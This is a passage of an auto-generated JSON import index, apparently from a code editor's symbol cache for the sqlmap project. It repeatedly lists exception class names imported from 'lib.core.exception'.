        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapBaseException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapInstallationException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSilentQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapInstallationException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingPrivileges",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSilentQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedDBMSException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingPrivileges",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapBaseException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSkipTargetException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapThreadException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapInstallationException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapShellQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSilentQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapInstallationException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapCompressionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapCompressionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSkipTargetException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapTokenException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNotVulnerableException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapGenericException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapThreadException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNotVulnerableException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapBaseException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapFilePathException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingDependence",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapMissingMandatoryOptionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNoneDataException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapConnectionException",
        "importPath": "lib.core.exception",
        "description": "lib.core.exception",
        "isExtraImport": true,
        "detail": "lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
